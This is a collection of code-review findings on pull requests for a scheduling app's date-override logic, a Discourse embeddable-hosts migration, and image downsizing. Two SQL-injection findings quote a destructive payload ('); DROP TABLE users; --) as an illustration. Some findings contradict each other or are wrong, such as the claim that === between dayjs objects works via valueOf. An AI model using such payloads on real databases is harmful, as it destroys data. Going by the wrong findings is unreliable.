body: After `Promise.all(integrationsToDelete).then(async () => { ... })` resolves, the code schedules `prisma.booking.update` for last-attendee seat cancellation, but `integrationsToDelete` was built by `await getCalendar(credential); integrationsToDelete.push(calendar?.deleteEvent(...))`. Since `deleteEvent` is not awaited here, the pushed value is the unresolved Promise, which is correct. However this pattern is mixed with the broken recurring-event branch (see the other findings on lines 460/466), and the inconsistency makes the file easy to misread. After fixing the recurring branch, ensure the whole file consistently pushes pending Promises into the arrays that `Promise.all` later drains, instead of awaiting-then-pushing.

title: Duplicate `end` computation defeats working-hours-end check
body: In the newly added working-hours block (lines 138-150), both `start` and `end` are assigned the same expression: `const start = slotStartTime.hour() * 60 + slotStartTime.minute();` followed by `const end = slotStartTime.hour() * 60 + slotStartTime.minute();`. The second line looks like a copy-paste bug; `end` was clearly intended to represent the slot's end time (e.g., `slotEndTime.hour() * 60 + slotEndTime.minute()` or `start + eventLength`). With `end === start`, the predicate condition `end > workingHour.endTime` actually tests `slotStartTime > workingHour.endTime`, which never checks whether the slot itself extends past the end of the working hour. Concrete consequence: for working hours 09:00-17:00 and a 60-minute slot starting at 16:30, the slot occupies 16:30-17:30 and crosses the end of the working day, yet the predicate evaluates `16:30 > 17:00` (false) and `16:30 < 09:00` (false), so `find` never returns truthy, the slot is not rejected, and it is returned as available even though part of it lies outside working hours. The same mis-check also breaks any check on the slot extending past the start of the working hour.

title: Working-hours check uses inverted logic and rejects slots that lie inside a working-hour block
body: The new check `if (workingHours.find(wh => /* slot outside this wh */)) return false;` rejects the slot as soon as ANY working-hour entry (for the slot's day) excludes it. For a single host with multiple working-hour blocks per day — a common case, e.g. 09:00-12:00 and 14:00-17:00 — this is the opposite of the correct semantics. Example: a 60-minute slot at 10:00 falls inside the first block (09:00-12:00), so the predicate returns undefined for that entry, but `find` continues to the second block (14:00-17:00) where the slot is outside, the predicate returns true, `find` returns truthy, and the slot is wrongly marked unavailable even though the host is clearly working. The check needs to verify that the slot lies within at least one working-hour entry (e.g., `workingHours.some(wh => wh.days.includes(...) && start >= wh.startTime && end <= wh.endTime)`) and only reject when the slot is outside all of them.

title: No automated test for the round-robin fixed-host date override fix
body: The PR description and manual-testing instructions explicitly describe a round-robin event with one fixed host and one round-robin (loose) host, plus a date override for the fixed host, as the central scenario being fixed (`checkIfIsAvailable` now considers `dateOverrides` and `workingHours` per host). The only test added in this PR is a copy of the existing 'Check for Date overrides' case with a different invitee timezone, which exercises the offset conversion in `packages/lib/slots.ts` but does not exercise the new logic in `checkIfIsAvailable` at all. There is no test that creates a round-robin event with a fixed host having a date override, nor one that asserts slots are correctly pruned by the new per-host date-override/working-hours check. A regression in either the duplicated-`end` bug, the inverted working-hours logic, or the per-host date-override path would not be caught by CI.

title: Variable `utcOffset` is misleadingly named; it is the negated offset
body: Line 107 declares `const utcOffset = dayjs.tz(date.start, organizerTimeZone).utcOffset() * -1;`. The value stored is the negation of the timezone's UTC offset (e.g. -330 for IST), but the name suggests it is the offset itself. Both the surrounding code (`dayjs(date.start).add(utcOffset, 'minutes')`) and the inner time-range comparisons rely on this sign in a way that is easy to get wrong on future edits. Naming it `negatedUtcOffset` (or simply inverting the sign at the call site with a clarifying comment) would prevent future maintainers from introducing subtle off-by-the-offset bugs in this date-override filter.

title: Working-hours end uses slotStartTime instead of slotEndTime
body: In the new working-hours check in `checkIfIsAvailable`, `end` is computed as `slotStartTime.hour() * 60 + slotStartTime.minute()` — the same value as `start`. It should be `slotEndTime.hour() * 60 + slotEndTime.minute()`. Consequence: the `end > workingHour.endTime` half of the condition can never trigger, so a slot that starts inside working hours but whose end spills past `workingHour.endTime` (e.g. working hours 09:00–17:00, slot 16:30–17:30) is incorrectly treated as inside working hours. With a 60-minute event this can return bookable slots that extend past the organizer's day.

title: Dayjs objects compared with === instead of isSame
body: `if (dayjs(date.start).add(utcOffset, "minutes") === dayjs(date.end).add(utcOffset, "minutes"))` compares two freshly-constructed Dayjs objects with strict equality. Dayjs objects are compared by reference, so this branch is unreachable. The intent appears to be "override has zero duration / is empty", which should be `…isSame(…)`. Consequence: an empty/zero-length date override is never short-circuited and the surrounding code falls through to the other boundary checks, which can produce wrong availability when start and end coincide.

title: Working-hours day/hour/minute read from UTC, not organizer tz
body: `slotStartTime` is `time.utc()`, so `slotStartTime.day()`, `.hour()` and `.minute()` return UTC values, while `workingHours` are stored in the organizer's timezone. The membership check `workingHour.days.includes(slotStartTime.day())` and the minute comparison will be wrong near day boundaries or for organizers not in UTC (e.g. a slot at 23:30 IST = 18:00 UTC will be checked against the UTC day/hour instead of the IST day/hour). This can return slots outside the organizer's working day or filter out slots that should be available.

title: Date-override day match is compared in UTC, not organizer tz
body: `dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD") === slotStartTime.format("YYYY MM DD")` compares two UTC-formatted dates. The date override is a calendar day in the organizer's timezone, and `slotStartTime` is in UTC. Around the day boundary (e.g. override on 2024-01-01 IST = 2023-12-31 18:30 UTC …) a slot on the correct local day can be compared against the wrong UTC date and the override will be silently ignored. Use the organizer's timezone for both sides of the comparison (e.g. `dayjs.tz(slotStartTime, organizerTimeZone).format(...)`).

title: Override boundary check is strict, missing same-instant starts
body: `slotStartTime.isAfter(dayjs(date.end).add(utcOffset, "minutes"))` is strict: a slot whose start equals the override end is not filtered, and slots that straddle the override end (e.g. override 14:00–18:00, slot 17:30–18:30) are also not filtered because there is no check that the slot end is within the override. The check should also require `slotStartTime` not to be after `date.end` (use `isSameOrAfter` or also verify the slot end) and the same boundary issue applies to `date.start` (a slot that begins before the override starts but ends inside it slips through).

title: checkIfIsAvailable ignores override.timeZone, uses caller-supplied organizerTimeZone
body: `dateOverrides` are flattened with `timeZone: availability.timeZone` attached, but `checkIfIsAvailable`'s signature drops that field (type is `{ start: Date; end: Date }[]`) and instead uses the caller-supplied `organizerTimeZone` to compute the UTC offset for `date.start`. If a date override was created in a timezone different from the one currently passed as `organizerTimeZone` (e.g. round-robin where a fixed host's override was stored with one tz and `schedule.timeZone` resolves to another, or DST boundary), the override's intended local time will be misinterpreted, returning the wrong availability.

title: override.start.toString() parsed in server local tz, then re-zoned
body: `dayjs(override.start.toString()).tz(override.timeZone).utcOffset()` first stringifies a Date (which embeds the server's local timezone offset) and parses it back, then re-zones. The resulting `utcOffset` depends on the server's TZ rather than being a pure UTC interpretation. On any server not running in UTC the organizer/invitee offset values (and therefore the computed `offset` and the resulting `startTime`/`endTime`) will be wrong. Use `dayjs.utc(override.start)` (or pass the Date directly) before `.tz(...)`.

title: override startTime/endTime computed in UTC, not invitee local time
body: `dayjs(override.start).utc().add(offset, "minute").hour() * 60 + …` produces the hour/minute of the shifted UTC instant, but the surrounding `buildSlots` compares these values to `dayStart` which is in the invitee's local timezone. The result is that for two invitees in different timezones the same `startTime` value yields the same UTC slot, regardless of invitee tz. This is exactly the behavior the PR description claims to fix ("date overrides didn't adjust to different timezones"). The correct computation is the override's start in the invitee's local tz, e.g. `dayjs(override.start).tz(timeZone).hour() * 60 + dayjs(override.start).tz(timeZone).minute()`.

title: New test asserts same UTC slots for two different invitee timezones
body: The new `scheduleForEventOnADayWithDateOverrideDifferentTimezone` case calls `getSchedule` with `timeZone: "Asia/Dhaka"` and expects the identical UTC slots `[08:30, 09:30, 10:30, 11:30]` as the IST case, with the comment "it should return the same as this is the utc time". The PR description says the fix makes date overrides adjust to the attendee's timezone, so two invitees in materially different timezones (e.g. IST vs America/Los_Angeles) should see different UTC slots. The test as written locks in the pre-fix behavior and will not catch a regression of the stated bug; it also only spans a 30-minute tz difference which doesn't expose the problem at all.

title: No test covers the round-robin fixed-host date-override fix
body: The PR description states the primary bug fix is that 'date overrides of fixed hosts are taken into account for round-robin events' (Fixes #8207, #8273). The only test added (lines 786-804) re-runs the existing personal-event 'Check for Date overrides' scenario with a different invitee timezone. There is no test that creates a round-robin event with a fixed host, adds a date override for that fixed host, and asserts that the returned slots are restricted to the fixed host's override. Without such a test the main advertised fix is unverified and could regress silently.

title: checkIfIsAvailable workingHours check has duplicated start/end computation
body: Inside checkIfIsAvailable the new workingHours branch computes `const start = slotStartTime.hour() * 60 + slotStartTime.minute();` and then `const end = slotStartTime.hour() * 60 + slotStartTime.minute();` -- both variables are identical (copy-paste of the same expression). The subsequent guard `if (start < workingHour.startTime || end > workingHour.endTime)` therefore only checks the slot's start time against both bounds and never validates that the slot actually fits inside the working window. A slot starting 30 minutes before the configured end of the working hours (e.g. start 17:30 with workingHour.endTime 18:00 and eventLength 60) would be wrongly accepted. To check whether the slot fits, `end` must be the slot end (slotStartTime + eventLength) or the comparison must be expressed as `slotEnd > workingHour.endTime`.

title: checkIfIsAvailable mixes UTC and local timezones when matching override date to slot date
body: `slotStartTime = time.utc()` (UTC) is compared via `slotStartTime.format('YYYY MM DD')`. The other side, `dayjs(date.start).add(utcOffset, 'minutes').format('YYYY MM DD')`, uses `dayjs(date.start)` (parsed in the server's local timezone) plus an offset, and then formats in the server's local timezone. On any server whose local timezone is not the same as `organizerTimeZone` (or UTC) the two formatted dates can disagree for slots at the boundary of a day, causing date overrides to be ignored or applied to the wrong day. Both sides must be normalized to the same timezone (e.g. `dayjs.utc(date.start).tz(organizerTimeZone).format(...)` on the left, and `slotStartTime.tz(organizerTimeZone).format(...)` on the right).

title: checkIfIsAvailable uses side effects inside Array.find and only honors the first matching date override
body: The new code reuses `Array.prototype.find` to set the outer `dateOverrideExist` flag as a side effect while also using its return value to decide whether the slot is inside the override. As soon as the first matching override returns `true` (slot outside that override), the remaining overrides are skipped. For a user with several date overrides on the same day (e.g. one morning, one afternoon) only the first is consulted, so a slot that lies inside the second override but outside the first is wrongly classified. The mutation of `dateOverrideExist` from inside `find` is also fragile and easy to break in future refactors. The override matching should be written as an explicit loop or `Array#some`/`every` without mutating shared state.

title: checkIfIsAvailable compares day/hour/minute in UTC against organizer's working hours
body: `slotStartTime = time.utc()` puts the slot in UTC, so `slotStartTime.day()`, `slotStartTime.hour()` and `slotStartTime.minute()` return UTC values. The `workingHour` records, however, are expressed in the organizer's timezone (their `days` array and `startTime`/`endTime` in minutes since organizer-local midnight). With any non-zero UTC offset this check is wrong: e.g. an organizer in IST with working hours 09:30-18:00 IST would see a slot at 04:30 UTC (=10:00 IST, inside working hours) produce UTC day/hour = previous-day/04, which does not match `workingHour.days.includes(...)` and `start < workingHour.startTime` is false but the wrong-day branch will be exercised. The slot must be converted to organizerTimeZone (`slotStartTime.tz(organizerTimeZone)`) before reading day/hour/minute.

title: Date override offset uses Date.toString() and reparses in the server's local timezone
body: The new override offset calculation is `const organizerUtcOffset = dayjs(override.start.toString()).tz(override.timeZone).utcOffset();`. `override.start` is already a Date; calling `.toString()` produces a locale-dependent representation which dayjs then parses using the server's local timezone. On a server whose local timezone is not UTC this shifts the underlying moment in time, and consequently the `utcOffset()` (which depends on the moment, e.g. across DST boundaries) can be computed at the wrong instant. The same pattern is used for `inviteeUtcOffset`. Use the Date directly: `dayjs(override.start).tz(override.timeZone).utcOffset()` (or `dayjs.utc(override.start).tz(override.timeZone).utcOffset()` to be unambiguous).

title: dayjs(override.start).utc().add(offset, ...) computed four times per entry
body: The new override branch evaluates `dayjs(override.start).utc().add(offset, 'minute')` twice and the equivalent expression for `override.end` twice (lines 219-223). With many overrides per day this multiplies the cost unnecessarily and also makes the four expressions easy to drift out of sync in future edits. Compute each adjusted moment once and reuse it for both `.hour()`/`.minute()` and the equality check.

title: Strict-equality on dayjs objects depends on undocumented valueOf
body: The new date-override zero-length guard uses `dayjs(date.start).add(utcOffset, 'minutes') === dayjs(date.end).add(utcOffset, 'minutes')`. Two freshly constructed dayjs instances are never `===` unless their `valueOf()` (millisecond timestamp) is equal, which is true here only because dayjs forwards valueOf to the underlying timestamp. This works but is non-obvious and breaks if dayjs is ever replaced or if `add` introduces sub-millisecond precision differences. Use `.isSame(other, ...)` or compare `valueOf()` explicitly.

title: SQL injection in data migration
body:
The host value `#{h}` is interpolated directly into raw SQL:

  execute "INSERT INTO embeddable_hosts (host, category_id, created_at, updated_at) VALUES ('#{h}', #{category_id}, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"

Any single quote, backslash, or other special character in a legacy `SiteSetting.embeddable_hosts` value will break the SQL or inject arbitrary statements. A normally configured host like `weird-host's.com` would either corrupt the row or fail the migration entirely; a hostile value (which only an admin could plant, but the surface is the data) could execute arbitrary SQL. Use ActiveRecord's parameterized `EmbeddableHost.create!(host: h, category_id: category_id)` (or bind parameters on `execute`) instead of string interpolation.

title: NoMethodError when no matching category row exists
body: `execute("SELECT c.id FROM categories AS c INNER JOIN site_settings ... WHERE s.name = 'embed_category'")[0]['id'].to_i` will raise NoMethodError (`undefined method 'id' for nil`) if the SELECT returns no rows (e.g., the legacy `embed_category` setting was empty, missing, or pointed to a non-existent category name). The `if category_id == 0` guard below only protects against `category_id == 0`; it never runs because the preceding line already raised. Guard against the empty result, e.g. `row = ...; category_id = row && row[0]['id'].to_i`.

title: before_validation crashes when host is nil
body: The callback invokes `self.host.sub!(/^https?:\/\//, '')` and `self.host.sub!(/\/.*$/, '')`. If `host` is nil (e.g., a controller passes `params[:embeddable_host][:host]` that is missing or `nil`), `nil.sub!` raises NoMethodError before any validation message is generated, producing a 500 instead of a clean 422. Use `self.host.to_s.sub!` or check `self.host.present?` first, and consider switching to non-mutating `gsub` to avoid mutating shared string instances.

title: update action crashes if record lookup returns nil
body: `host = EmbeddableHost.where(id: params[:id]).first` can return nil (unknown id), but `save_host(host)` then calls `host.host = ...`, raising NoMethodError on the nil receiver. Either guard with `return render_json_error(...not_found...)` or `save_host` must handle nil. Same problem in `destroy` on line 16: `host.destroy` on nil raises NoMethodError instead of returning a 404.

title: destroy action crashes if record lookup returns nil
body: `host = EmbeddableHost.where(id: params[:id]).first` followed by `host.destroy` raises NoMethodError when no row matches. Should return a 404 (or at least `render_json_error`) when the record cannot be found, matching REST expectations.

title: save_host assumes nested params without guarding
body: `params[:embeddable_host][:host]` and `params[:embeddable_host][:category_id]` raise NoMethodError when a non-nested request body or an unrelated shape is sent. Wrapping with `params.require(:embeddable_host).permit(:host, :category_id)` (or a `params[:embeddable_host].present?` guard) would convert the request into a clean 400 with the existing error rendering path.

title: PUT endpoint never persists anything
body: `Admin::EmbeddingController#update` simply re-renders the existing `@embedding` OpenStruct without reading any attributes or persisting any change. Combined with the `saveChanges` JS action that has no template binding, this endpoint is effectively a no-op dressed as a save. Either remove the route/action or have it accept and persist the submitted payload. As written it silently swallows PUTs, which could mask a real bug later when UI starts exercising it.

title: Spec only asserts inheritance, not behavior
body: The new controller's `create`, `update`, and `destroy` actions have no tests at all - not even happy-path coverage, param shape validation, or auth checks. The two bugs above (nil record lookup, missing nested params) would have been caught by minimal request specs. Add specs that POST/PUT/DELETE with valid and invalid ids and shapes.

title: Fabricator file contents swapped from filename
body: `spec/fabricators/category_fabricator.rb` now defines `Fabricator(:embeddable_host)` while every category-shaped fabricator (`:category`, `:diff_category`, `:happy_category`, `:private_category`) was moved to the new `spec/fabricators/embeddable_host_fabricator.rb`. The file containing the category fabricators is named for a different model, so anyone editing tests for categories will be looking in the wrong place. The contents should be restored so the file naming matches what it actually defines.

title: edit action reads id off possibly-missing category
body: `this.set('categoryId', this.get('host.category.id'))` crashes when `host.category` is undefined. For the standard pencil flow on existing rows `category` is hydrated server-side, but if category hydration ever fails (e.g., category deleted, rest serializer misconfigured) the entire component breaks. Use `(this.get('host.category') || {}).id` or a helper to read safely.

title: pathFor silently ignores findArgs/id
body: The custom `pathFor` returns the hard-coded `/admin/customize/embedding` and drops any `findArgs`/`id` argument. It currently happens to work because both `find` and `update` resolve to that single route, but anything that legitimately wants to send an id (e.g., a future destroy/update-by-id, or even just `findAll`) will go to the wrong URL with no diagnostic. Either extend `pathFor` to handle arguments properly or add a comment documenting the intentional limitation.

title: Removed method leaves config/locales blank
body: Both `embeddable_hosts` and `embed_category` translations and YAML keys were removed in tandem with the model method, but the old JSON-API style removal comment is not present and there is no migration comment explaining the data movement. The shipped migration file (20150818190757) does the data backfill, which is good, but anyone running an out-of-order deploy against an already-migrated DB will simply lose both settings with no diagnostic. Consider also handling the setting rows on initial run rather than only in `change`.

title: update/destroy crash when record is not found
body: In `Admin::EmbeddableHostsController`, `update` and `destroy` both look up the host with `EmbeddableHost.where(id: params[:id]).first` and then call `save_host(host)` / `host.destroy` without a nil check. When the id doesn't match an existing record, `host` is `nil`, and `save_host(nil)` raises `NoMethodError` on the next line (`host.host = …`) while `destroy` raises on `host.destroy`. A single bad PUT or DELETE (e.g., from a stale tab, bookmarked URL, or attacker probing the endpoint) takes down the request with a 500 instead of returning a clean 404/not-found response.

title: No strong parameters and unfiltered raw mass assignment
body: `save_host` reads `params[:embeddable_host][:host]` and `params[:embeddable_host][:category_id]` directly, with no strong-parameters whitelist and no presence check on the hash. An attacker submitting an empty body, a non-hash payload, or extra keys (e.g. `embeddable_host[created_at]=…`) triggers `NoMethodError` or, more importantly, can pass arbitrary `category_id` and overwrite the host attribute silently (the category_id validation is the only guard). Submitting a missing `:embeddable_host` key crashes the endpoint with a 500.

title: SQL injection via string interpolation in migration
body: The data migration inserts each embeddable host with `execute "INSERT INTO embeddable_hosts (host, …) VALUES ('#{h}', …)"`. The `h` value comes from the persisted `SiteSetting.embeddable_hosts` text column, which is admin-editable, so it can legitimately contain a single quote / semicolon / comment (e.g. `evil'); DROP TABLE users; --`). Interpolation, rather than `ActiveRecord::Base.connection.quote(h)`, executes that fragment verbatim during `db:migrate`. Anyone able to set the site setting before migration runs can break or alter the database.

title: Migration crashes when embed_category row is absent
body: `category_id = execute("SELECT c.id FROM … WHERE s.name = 'embed_category'")[0]['id'].to_i` assumes the subquery returns at least one row. On any install that never set the `embed_category` site setting (the common case after this PR removes the setting), `[0]` is `nil` and calling `['id']` raises `NoMethodError`, aborting the migration. The `if category_id == 0` fallback below only protects against a numeric zero, not against the `nil` array element.

title: Server response never embeds the full EmbeddableHost objects, so client-side hydration produces undefined entries
body: `EmbeddingSerializer` declares `has_many :embeddable_hosts, … embed: :ids`, so the JSON body only contains `embeddable_host_ids: [...]` – the host records themselves are NOT side-loaded in the response. On the client, `store.js` `_hydrateEmbedded` matches the new `(.+)_id(s?)$` regex and calls `_lookupSubType('embeddable_host', 'embedding', id, root)`. That helper looks up `root[this.pluralize('embeddable_host')]` (i.e. `root['embeddable_hosts']`), which does not exist, and (unlike `category`) there is no global cache for embeddable hosts, so the lookup returns `undefined` for every id. The result is that the rendered `embedding.embeddable_hosts` array is full of `undefined` – the admin Embedding page will appear empty (only the Add Host button shows), and any subsequent save/edit on those rows will throw when the component accesses `host.category` / `host.host`.

title: PUT /admin/customize/embedding is a silent no-op that returns 200
body: `EmbeddingController#update` just re-renders the current `@embedding` without ever reading the request body or persisting anything. The PUT route is wired up and the JSON adapter is configured to call it, so any client PUT (and the controller-level `saveChanges` action that calls `update({})`) will succeed silently. Worse, the misleading 200 response means a client bug can never be detected – nothing was saved but the caller is told everything was fine. This either should be removed or actually persist the requested changes.

title: before_validation raises NoMethodError when host is nil
body: `before_validation` calls `self.host.sub!(/^https?:///, '')` directly on `self.host`. There is no `validates_presence_of :host` on the model and the database column is `null: false`, so a record constructed via `EmbeddableHost.new` (no attrs), `EmbeddableHost.new(host: nil)`, or one whose host gets blanked out in another callback will raise `NoMethodError: undefined method 'sub!' for nil:NilClass` on save instead of producing a clean validation error. The controller happens to always assign a host, but the model itself isn't safe to use standalone.

title: expandable_first_post? test no longer covers the embeddable_host condition
body: After this PR removes `SiteSetting.embeddable_hosts.present?` from `Topic#expandable_first_post?`, the test `it "is false if embeddable_host is blank"` and the surrounding `describe 'with an emeddable host'` block (which `Fabricate(:embeddable_host)` in its setup) only check `SiteSetting.embed_truncate?` and `has_topic_embed?` – the embeddable_host presence is irrelevant. The 'no embeddable host' assertion now passes vacuously (it just checks the default SiteSetting + topic state) and would not catch a regression where someone re-introduces a host-presence requirement. The test setup and name should be updated to reflect the actual contract.

title: category_id is silently dropped when no EmbeddableHost row matches the URL
body: `TopicEmbed.import` now derives the category purely from `EmbeddableHost.record_for_host(url)`. If the host is not registered (typo in URL, race condition where an import races a host deletion, etc.), `eh.try(:category_id)` is `nil` and the post is created with no category, falling through to `SiteSetting.uncategorized_category_id` via Topic's callback. Previously the category came from `SiteSetting.embed_category` (always defined), so the new path silently funnels misclassified imports into uncategorized without any warning. The callers in `topic_retriever.rb` already short-circuit when the host is not allowed, so this is mostly correct, but a brief log/raise would catch data-pipeline bugs.

title: SQL injection in data migration
body: The migration string-interpolates the per-line host value directly into an INSERT statement: `INSERT INTO embeddable_hosts (host, category_id, ...) VALUES ('#{h}', #{category_id}, ...)`. The `h` strings come from the `embeddable_hosts` site setting, which an admin controls. The model-level `validates_format_of :host` does NOT run during this raw INSERT, so values like `'); DROP TABLE users; --` would be inserted verbatim and could corrupt or destroy the database. Use parameterized SQL (e.g. `execute("INSERT ... VALUES (?, ?, ...)", h, category_id)`) or instantiate `EmbeddableHost.new(host: h, category_id: category_id).save(validate: false)` so input is escaped.

title: Migration raises NoMethodError when embed_category was never set
body: The first query `execute("SELECT c.id FROM categories AS c INNER JOIN site_settings AS s ON s.value = c.name WHERE s.name = 'embed_category'")` returns zero rows when the `embed_category` site setting was never populated (which is the common case for fresh installs and for any install that doesn't use embedding). The code then does `...[0]['id'].to_i`, which throws `NoMethodError: undefined method '[]' for nil:NilClass` and aborts the migration, leaving the DB in a half-migrated state. Guard the lookup (e.g. check `result.cmd_tuples > 0` before indexing) and fall back to `SiteSetting.uncategorized_category_id` when the join yields nothing.

title: Admin embedding page cannot render existing embeddable_hosts
body: `EmbeddingSerializer` declares `has_many :embeddable_hosts, ..., embed: :ids`, which only emits `embeddable_host_ids: [..]` on the parent and does NOT include the `embeddable_hosts` collection in the payload root. On the client, `store._hydrateEmbedded` then looks up each ID via `_lookupSubType('embeddable_host', ...)` which depends on `root['embeddable_hosts']` existing, finds nothing, and assigns `embedding.embeddable_hosts = [undefined, undefined, undefined]`. The Handlebars `{{#each embedding.embeddable_hosts}}` iterates those undefined entries and crashes the component when it dereferences `host.isNew` / `host.host`. As a result the page can't display any pre-existing hosts. Either include the `embeddable_hosts` collection in the response root (e.g. embed: :objects, or have the route do a separate `findAll('embeddable-host')`), or have the serializer/hydration fall back to a freshly-fetched list.

title: before_validation crashes with NoMethodError when host is blank
body: `before_validation` unconditionally calls `self.host.sub!(/^https?:\/\//, '')`. If the attribute is nil or was never assigned (e.g. a Fabricator without a `host:`, or a controller call that omits the param), `sub!` is invoked on nil and raises `NoMethodError`, instead of being reported as a 422 validation error. Add `validates_presence_of :host`, guard the `sub!` (e.g. `self.host = (self.host || '').sub(...)` then assign back), and the model-level presence validation will then return clean errors.

title: No uniqueness constraint on EmbeddableHost.host
body: Neither the model nor the migration enforce uniqueness on `host`. Multiple admins can create duplicate rows for the same site, leaving stale rows that survive deletion and confuse the host picker. Add `validates :host, presence: true, uniqueness: { case_sensitive: false }` on the model and `add_index :embeddable_hosts, :host, unique: true` (case-insensitive) in the migration so race conditions can't create duplicates.

title: Update and destroy crash when EmbeddableHost is missing
body: `update` does `host = EmbeddableHost.where(id: params[:id]).first` then calls `save_host(host)`, which immediately invokes `host.host = ...` on nil. `destroy` does `host.destroy` on nil. Any PUT/DELETE to `/admin/embeddable_hosts/<bogus-id>` raises NoMethodError and returns a 500 instead of a 404. Guard the lookup with `host || (raise Discourse::NotFound)` (or `head :not_found`) before use.

title: Admin::EmbeddingController has no behavioural tests
body: The only spec for `Admin::EmbeddingController` checks that it is a subclass of `Admin::AdminController`. The new admin embedding page is the centrepiece of this PR: GET should require staff and return a serialized embedding with its hosts, PUT should round-trip the (no-op) update. Without at least one happy-path and one unauthorized request test, regressions in routing, the serializer, or the staff-only filter will go unnoticed.

title: Admin::EmbeddableHostsController has no CRUD tests
body: The only spec checks class inheritance. There is no coverage for `create`/`update`/`destroy`, no test verifying that a blank `host` is rejected (regression risk on the `before_validation`/presence gap), no test that the `category_id` falls back to `SiteSetting.uncategorized_category_id`, and no test that unknown IDs return 404. Add specs covering at least: create with valid params, create with blank/invalid host returning 422, update changing both fields, destroy with missing id returning 404, and authorization for non-admin staff.

title: Migration skips model validations during data backfill
body: The backfill INSERTs hosts directly via `execute`, bypassing `validates_format_of :host` and the `before_validation` normalization (http(s):// and trailing-path stripping). Any existing entries containing `http://`, a trailing path, or characters outside `[a-z0-9\-\.]` are reproduced verbatim, then fail format validation when an admin later edits them. Either run the same normalization in SQL inside the migration or call `EmbeddableHost.create!(host: h, category_id: category_id, skip_validation: false)` (or use the model's `before_validation` to clean values before insertion).

title: Embedded topic silently created with wrong/nil category when host lookup fails
body: `eh = EmbeddableHost.record_for_host(url)` returns false (not nil) when no host matches, and `try(:category_id)` then yields `nil`. The PostCreator is called with `category: nil`, which combined with `SiteSetting.allow_uncategorized_topics = false` and the Topic validates produce behaviour that diverges from the previous behaviour (`SiteSetting.embed_category`, which was always set or nil). Previously it was obvious when there was no configured category; now import can succeed silently or fail in `changed_to_category`, with no error surfaced to the caller. Consider raising or returning nil explicitly when `eh` is false so the caller knows the URL didn't match a configured host and the topic was not created in the expected category.

title: Duplicate `self.downsize` definition - older 4-argument signature is unreachable
body: Two class methods named `self.downsize` are now defined on OptimizedImage (lines 145-147 and 149-151). Ruby does not support method overloading: redefining a method silently replaces the previous one, so the older `downsize(from, to, max_width, max_height, opts={})` becomes dead code and the only `downsize` that actually exists is `downsize(from, to, dimensions, opts={})`. Any other caller in the codebase that still uses the old signature with separate integer width/height arguments will be dispatched to the new method, where the third positional argument is interpreted as a single `dimensions` string. For example, `OptimizedImage.downsize(path, path, 100, 200)` would set `dimensions = 100` and `opts = 200` (an Integer), and any subsequent use of `opts[:force_aspect_ratio]` or `opts[:allow_animation]` will raise a `TypeError: no implicit conversion of Symbol into Integer` because `Integer` does not respond to `[]`. Either remove one of the two definitions, or rename the new method (e.g., `downsize_to_dimensions` / `downsize_to`) so both signatures remain callable.

title: Downsize loop ignores OptimizedImage.downsize return value, wasting 5 attempts on failure
body: The new downsize loop in `create_upload` calls `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", allow_animation: SiteSetting.allow_animated_thumbnails)` but does not inspect its return value. `OptimizedImage.downsize` swallows all exceptions internally and returns `false` on failure (ImageMagick/gifsicle errors, corrupt or unsupported image, missing binary, etc.), so when downsize fails the on-disk size does not decrease and the loop spins through all 5 attempts pointlessly, each time re-invoking ImageMagick on a file it cannot process. After exiting, the still-too-large file is handed to `Upload.create_for`, which will reject it and surface a confusing error to the user after several wasted conversions. The call should be checked (break out of the loop and ideally abort the upload on `false`) or wrapped in a rescue that bails out of the downsize attempt early.

title: OptimizedImage.downsize redefined from 4-arg to 3-arg form, silently breaking existing callers
body: The class method `OptimizedImage.downsize` is now defined twice in the same class. The second definition (`def self.downsize(from, to, dimensions, opts={})` at line 149) replaces the first one (`def self.downsize(from, to, max_width, max_height, opts={})` at line 145), so the 4-argument form is gone. Any other caller in the codebase that still does `OptimizedImage.downsize(from, to, 800, 600)` (a 4-arg call with separate width/height integers) will now either raise ArgumentError or, worse, have its 4th argument silently bound to `opts` while `800` becomes the dimensions string, producing nonsensical ImageMagick commands like `-resize 800x`. This is a hidden API break in a helper that is used by thumbnail jobs and other places; the new signature should be a new method name (e.g. `downsize_to`) and the old 4-arg form should be preserved or deprecated explicitly.

title: 5 downsize iterations are mathematically insufficient for the feature to work
body: Each pass uses `"80%"` dimensions, which shrinks image area to 0.8² = 0.64 of the original, so the file size drops by roughly 36% per iteration. After 5 iterations the file is approximately 0.64⁵ ≈ 33% of the original. With the default `max_image_size_kb` of 10MB, any source image above ~30MB cannot be brought under the limit in 5 passes; for example a 50MB image ends up at ~16MB and a 100MB image at ~33MB. The `while` loop then exits and `Upload.create_for` is invoked with an oversized file, so the 'auto-downsize' feature silently fails for any but moderately large images. Either the iteration count must scale with the initial size, the reduction factor must be more aggressive, or the loop should compute the required scale per iteration and pass it to `OptimizedImage.downsize`.

title: Client upload size cap hardcoded to 10MB, bypassing the site setting
body: `validateUploadedFile` previously read the cap from `Discourse.SiteSettings['max_' + type + '_size_kb']`, supporting independent `max_image_size_kb` and `max_attachment_size_kb`. It is now hardcoded to `10 * 1024` for every type. Consequences: (1) administrators lose the ability to tighten or loosen the client-side cap; (2) when an admin sets `max_image_size_kb` lower than 10MB the client still accepts up to 10MB and the user only finds out the upload is too large after the round trip; (3) the previous per-type distinction between images and attachments is lost. The site setting should still drive this value, or at minimum the hardcoded constant should be derived from the setting.

title: 413 error message shows hardcoded 10MB instead of configured limit
body: The 413 branch of `displayErrorForUpload` previously displayed `Discourse.SiteSettings.max_image_size_kb` in the user-facing `file_too_large` error. It now uses a hardcoded `10 * 1024`, so the size quoted in the error dialog no longer matches the actual configured `max_image_size_kb`. Users will see '10MB' even when the real limit is 2MB or 50MB, leading to confusing UX after any admin change to the site setting.

title: In-place downsize overwrites source file and ignores failure
body: `OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...)` reads from and writes to the same path. If the convert/gifsicle invocation fails (corrupt input, OOM, signal, bad permissions), ImageMagick may truncate or zero out the file before erroring, and the loop never checks the return value (`OptimizedImage.downsize` returns true/false), so the next iteration or the subsequent `Upload.create_for` will run on a corrupted/empty file. The fix is to write to a separate temp path, verify the result, then atomically rename, and to break out of the loop when downsize reports failure rather than blindly iterating again.

title: URL download cap is a hardcoded 10MB, no longer tied to max_image_size_kb
